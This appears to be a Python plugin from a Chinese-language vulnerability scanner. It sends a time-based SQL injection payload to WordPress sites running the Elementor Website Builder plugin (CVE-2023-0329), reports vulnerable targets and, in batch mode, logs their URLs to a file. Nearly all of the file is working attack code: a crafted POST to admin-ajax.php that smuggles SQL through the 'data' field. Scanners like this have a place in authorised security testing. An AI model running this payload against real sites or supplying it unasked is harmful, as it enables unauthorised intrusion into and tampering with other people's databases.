#! /usr/bin/python3
# -*- encoding: utf-8 -*-

from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Cve_2023_0329:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/wp-admin/admin-ajax.php'
        data = {
            "action": "elementor_ajax_save_builder",
            "editor_post_id": "1",
            "post_id": "1",
            "data": "test'),meta_key='key4'where+meta_id=SLEEP(2);#"
        }
        try:
            req = requests.post(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header,data=data)
            if "meta_key='key4'where+meta_id=SLEEP(2);#" in req.text:
                OutPrintInfoSuc("WordPress", f"存在Elementor网站生成器SQL注入漏洞{url2}")
                if not self.batch:
                    OutPrintInfo("WordPress", "参照 https://packetstormsecurity.com/files/175639/Elementor-Website-Builder-SQL-Injection.html")
                else:
                    with open("./result/wordpress_2023_0329.txt","a") as w:
                        w.write(f"{url2}\n")
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", "不存在Elementor网站生成器SQL注入漏洞")
        except Exception:
            if not self.batch:
                OutPrintInfo("WordPress", "不存在Elementor网站生成器SQL注入漏洞")
            return
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", "开始检测Elementor网站生成器SQL注入漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("WordPress", "Elementor网站生成器SQL注入漏洞检测结束")
